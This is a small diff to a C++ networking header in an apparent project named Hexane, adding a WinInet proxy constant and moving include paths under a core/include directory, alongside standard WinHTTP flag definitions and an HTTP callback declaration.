@@ -1,6 +1,7 @@
 #ifndef HEXANE_NETWORK_HPP
 #define HEXANE_NETWORK_HPP
 
+#define INTERNET_OPEN_TYPE_PROXY                            3
 #define WINHTTP_FLAG_BYPASS_PROXY_CACHE     				0x00000100
 #define WINHTTP_FLAG_REFRESH                				WINHTTP_FLAG_BYPASS_PROXY_CACHE
 #define WINHTTP_FLAG_SECURE                 				0x00800000
@@ -15,9 +16,9 @@
 #define INTERNET_FLAG_IGNORE_CERT_DATE_INVALID				0x00002000
 #define ERROR_HTTP_HEADER_NOT_FOUND							(INTERNET_ERROR_BASE + 150)
 
-#include <include/monolith.hpp>
-#include <include/cruntime.hpp>
-#include <include/utils.hpp>
+#include <core/include/monolith.hpp>
+#include <core/include/cruntime.hpp>
+#include <core/include/utils.hpp>
 
 namespace Http {
     FUNCTION VOID HttpCallback(PSTREAM Outbound, PSTREAM *Inbound);
